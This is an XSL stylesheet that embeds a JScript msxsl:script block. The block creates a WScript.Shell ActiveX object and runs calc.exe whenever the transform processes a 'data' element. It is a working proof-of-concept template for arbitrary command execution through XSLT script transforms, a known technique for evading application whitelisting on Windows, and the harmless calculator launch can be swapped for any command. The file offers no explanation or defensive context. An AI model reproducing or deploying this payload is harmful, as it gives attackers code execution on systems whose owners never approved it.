<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="http://mycompany.com/mynamespace">

 <msxsl:script language="JScript" implements-prefix="user">
<![CDATA[
  
      function test(){
        var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
      }
      
  
    ]]>
      </msxsl:script>

  <xsl:template match="data">
    <result>
      <xsl:value-of select="user:test()" />
    </result>
  </xsl:template>
</xsl:stylesheet>